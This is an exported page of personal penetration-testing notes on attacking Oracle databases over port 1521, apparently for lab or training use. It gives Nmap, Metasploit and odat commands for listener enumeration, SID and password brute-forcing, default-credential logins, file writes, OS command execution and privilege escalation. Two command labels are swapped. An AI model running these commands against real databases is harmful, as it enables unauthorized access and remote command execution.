<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1521 - Oracle</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 1521 - Oracle</h1></strong><br />• <a href="https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573">https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573</a> - Good intro<br />• <a href="https://tools.kali.org/vulnerability-analysis/oscanner">https://tools.kali.org/vulnerability-analysis/oscanner</a> - a tool that I haven&#39;t had work for me yet<br />• <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a> - tool that makes Oracle pen-testing trivial<br /><br /><strong><h2>## About Oracle</h2></strong><br />Oracle is a RDBMS - Relational Database Management System - produced and marketed by the company Oracle.<br />It&#39;s a database commonly used for running online transaction processing (OLTP), data warehousing (DW) and mixed (OLTP &amp; DW) database workloads<br /><br />Due to expensive licensing, you might still see old versions of Oracle running, like 10g and 11g.<br /><br /><strong><h3>### Oracle TNS listener</h3></strong><br />The Transparent Network Substrate (TNS) protocol handles client connections to Oracle Database instances via the TNS listener service, which listens on TCP port 1521.<br /><br />The listener service has its own authentication mechanism and is administered outside of the database. In its default configuration, you can interact with the TNS listener to retrieve useful information, and if unpatched, exploit it to intercept database traffic and execute commands remotely.<br /><br /><strong><h3>### Attacking Oracle process</h3></strong><br />There are about 5 steps to pen-testing Oracle:<br />1. Get Oracle info by talking to the TNS listener on port 1521<br />2. Enumerate for SIDs of the database<br />3. Use SID to brute-force for login credentials<br />4. Authenticate/connect to the database using credentials + SID<br />5. Priv-esc/pivot/do what you want now that you have access to the server<br /><br /><strong><h2>## Checklist</h2></strong><br />• Grab TNS version<br />   ◇ <code>nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV &lt;IP&gt;</code><br />   ◇ <code>msf&gt; use auxiliary/scanner/oracle/tnslsnr_version</code><br />   ◇ <code>tnscmd10g version -p 1521 -h &lt;IP&gt;</code><br />• Check version for exploits<br />   ◇ Oracle 9.2 - Universal XDB HTTP Pass Overflow<br />• Automated reconnaissance with odat tool<br />   ◇ <code>odat -s &lt;target ip&gt;</code><br /><br /><strong><h3>### Manual Reconnaissance</h3></strong><br /><strong>#### 1. Retrieve info from TNS listener</strong><br />   ◇ <code>tnscmd10g &lt;command&gt; -h 192.168.1.101</code><br />      ▪ If connection errors:<br />         - TNS versions might be incompatible - try <code>tnscmd10 --10g</code><br />         - Check the error code and google <br />         - Might need credentials - try bruteforcing<br />   ◇ Metasploit - <code>use auxiliary/admin/oracle/tnscmd</code><br />   ◇ <div class="codebox"><div class="codebox">#Commands&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Purpose<br />ping&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ping&nbsp;the&nbsp;listener<br />version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Provide&nbsp;output&nbsp;of&nbsp;the&nbsp;listener&nbsp;version&nbsp;and&nbsp;platform&nbsp;information<br />status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Return&nbsp;the&nbsp;current&nbsp;status&nbsp;and&nbsp;variables&nbsp;used&nbsp;by&nbsp;the&nbsp;listener<br />services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump&nbsp;service&nbsp;data<br />debug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump&nbsp;debugging&nbsp;information&nbsp;to&nbsp;the&nbsp;listener&nbsp;log<br />reload&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reload&nbsp;the&nbsp;listener&nbsp;configuration&nbsp;file<br />save_config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write&nbsp;the&nbsp;listener&nbsp;configuration&nbsp;file&nbsp;to&nbsp;a&nbsp;backup&nbsp;location<br />stop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke&nbsp;listener&nbsp;shutdown</div></div><br /><br /><strong>#### 2. Enumerate SIDs</strong><br />   ◇ Oracle 9 and below? - Query for the SID<br />      ▪ <code>tnscmd10g status -p 1521 -h &lt;IP&gt;</code><br />      ▪ <code>use auxiliary/scanner/oracle/sid_enum</code><br />   ◇ Oracle 10 and higher? - Bruteforce<br />      ▪ <code>use auxiliary/scanner/oracle/sid_brute</code><br /><br /><strong>#### 3. Have a valid SID value? - Brute force for a database account login/password</strong><br />• Oracle 9 and below? - Passwords not case sensitive - all usernames/passwords are uppercase.<br />• Oracle 10 and higher? - Passwords are case sensitive.<br />   ◇ Use <code>/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</code><br /><br />• Nmap<br />   ◇ <code>nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=&lt;sid vaule&gt; –n 10.11.21.20</code><br />   ◇ <code>nmap -p 1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=&lt;sid value&gt; -n 10.11.21.30</code><br /><br />• Metasploit<br />   ◇ <code>auxiliary/scanner/oracle/oracle_login</code><br /><br />• Odat<br />   ◇ <code>./odat passwordguesser -h</code><br /><br /><strong><h3>### Authenticate/Connect to Oracle Database</h3></strong><br />• sqlplus<br />   ◇ <code>sqlplus perfstat/perfstat@10.11.21.20:1521/TEST<br /></code>   ◇ <code>sqlplus &lt;user&gt;/&lt;password&gt;@10.11.21.20:1521/&lt;sid&gt;</code><br />   ◇ <code>sqlplus scott/tiger@10.10.10.82/XE as sysdba</code><br />• odat<br />   ◇ <code>odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba</code><br /><br /><strong><h3>### With access</h3></strong><br />• Read files<br />   ◇ Manual way<br /><br />• Write files to system<br />   ◇ Manual method<br />   ◇ <code>odat utlfile -s 10.10.10.82 -d XE -U scott -P tiger --sysdba --putfile &lt;remote path&gt; &lt;remote file&gt; &lt;local file&gt;</code><br /><br />• Execute commands<br />   ◇ via Java Stored Procedure<br />      ▪ <code>odat.py java -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec COMMAND</code><br />   ◇ via Scheduler<br />      ▪ <code>odat externaltable -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec &lt;command&gt;</code><br />   ◇ via External Tables <br />      ▪ <code>odat.py dbmsscheduler -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --exec &quot;C:\windows\system32\cmd.exe /c echo 123&amp;gt;&amp;gt;C:\hacK&quot;</code><br /><br />• Escalate Privileges<br />   ◇ <code>odat.py privesc -s $SERVER -d ID -U USER -P PASSWORD -h</code><br />   ◇ <code>msf&gt; use auxiliary/sqli/oracle/lt_findricset_cursor</code><br />      ▪ Should work 10.1.0.3.0 - 10.1.0.5.0<br />      ▪ Patched with Oracle Critical Patch update October 2007<br /><br /><br /><br /></div>
</body>
</html>
